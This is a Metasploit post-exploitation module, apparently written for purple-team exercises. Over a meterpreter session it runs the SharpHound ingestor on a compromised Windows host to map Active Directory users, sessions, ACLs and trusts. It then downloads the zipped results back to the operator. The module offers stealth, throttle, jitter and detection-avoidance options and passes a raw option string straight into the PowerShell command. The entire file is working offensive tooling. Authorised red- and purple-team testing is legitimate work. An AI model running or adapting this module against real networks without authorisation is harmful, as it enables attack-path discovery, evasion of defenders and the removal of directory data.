##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Powershell

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Active Directory Automated Discovery (BloodHound) Windows - Purple Team',
        'Description'   => %q{ BloodHound is an Active Directory visualization and attack path mapping tool. The BloodHound Ingestor queries Active Directory and outputs a complete picture of the environment in text format. The BloodHound application presents the data in an interactive graph. Attackers can use this functionality to gain situational awareness and identify potential misconfigurations. This module runs BloodHound with default options. Operators can supply additional options if required.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'References'	=> [ ['URL', 'https://github.com/BloodHoundAD/BloodHound'] ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('INGESTOR', [true, 'Ingestion method: 1=EXE, 2=PSH', '1']),
        OptString.new('CollectionMethod', [true, 'Choose a CSV subset of the followoing [All, Group, LocalAdmin, DCOM, RDP, Session, LoggedOn, ComputerOnly, Trusts, ACL, ObjectProps, Container, DCOnly]', 'Default']),
        OptBool.new('Stealth', [false, 'Use stealth collection options.', false]),
        OptBool.new('ExcludeDC', [false, 'Exclude domain controllers from session queries. Useful for ATA environments.', false]),
        OptString.new('Throttle', [false, 'Time in milliseconds to throttle between requests to computers.', nil]),
        OptString.new('Jitter', [false, 'Percent of jitter to apply to throttle.', nil]),
        OptString.new('ZipFileName', [false, 'Specify the filename for the zip file containing collection data.', "C:\\BloodHound.zip"]),
        OptString.new('OTHER_OPTS', [false, 'Specify a raw string of additional options to be passed explicitly to the ingestor.', nil]),
      ])
  end

  COLLECTION_METHODS = ["Default", "All", "Group", "LocalAdmin", "DCOM", "RDP", "Session", "LoggedOn", "ComputerOnly", "Trusts", "ACL", "ObjectProps", "Container", "DCOnly"]

  def run
  #
  # Run the powershell SharpHound ingestor.
  #
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"

      cmd = build_cmdstring()
      print_status("loading powershell...")
      client.run_cmd("load powershell")
      print_status("importing sharphound ingestor...")
      client.run_cmd("powershell_import data/purple/BloodHound/SharpHound.ps1")
      print_status("starting SharpHound with specified options: #{cmd}")
      client.run_cmd("powershell_execute \"#{cmd}\"")
      print_warning("sleeping for 45 seconds and then checking for SharpHound output files")
      sleep(45)

      if exists?(datastore['ZipFileName'])
        print_good("SharpHound file found! Downloading file from remote host")
        client.download_file(datastore['ZipFileName'], ".")
        print_good("BloodHound execution complete.")
      else
        print_warning("File not found. Execution may have failed or is not finished. SharpHound output is not present, so it may have failed silently. ")
        print_status("If it continues to fail, try manually uploading the ingestors in data/purple/BloodHound and running them on the host.")
      end

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("BloodHound execution failed.")
    end
  end


  def build_cmdstring()
  # bloodhound is great and has lots of options but this makes invoking the program a bit messy
  # build the command string that either invokes the EXE ingestor or runs a powershell script
  #
    cmdstring = "Invoke-BloodHound"
    argument_prefix = "-"

    # do collection methods first
    cmdstring += " #{argument_prefix}CollectionMethod "
    CSV.parse(datastore['CollectionMethod'])[0].each do |method|
      if not  COLLECTION_METHODS.include? method
         print_warning("'#{method}' is not a valid collection option and will be ignored.")
      else
        cmdstring += "#{method},"
      end
    end
    # remove the fencepost comma
    cmdstring.chop!

    cmdstring += " #{argument_prefix}Stealth" unless not datastore['Stealth']
    cmdstring += " #{argument_prefix}ExcludeDC" unless not datastore['ExcludeDC']
    cmdstring += " #{argument_prefix}Throttle #{datastore['Throttle']}" unless datastore['Throttle'].nil?
    cmdstring += " #{argument_prefix}Jitter #{datastore['Jitter']}" unless datastore['Jitter'].nil?

    # could probably add some flexibility here - this will force zipping of the data always, and require
    # any additional opts to be passed in a bulk string
    cmdstring += " #{argument_prefix}ZipFileName #{datastore['ZipFileName']}"
    cmdstring += " #{datastore['OTHER_OPTS']}" unless datastore['OTHER_OPTS'].nil?

    return cmdstring
  end
end
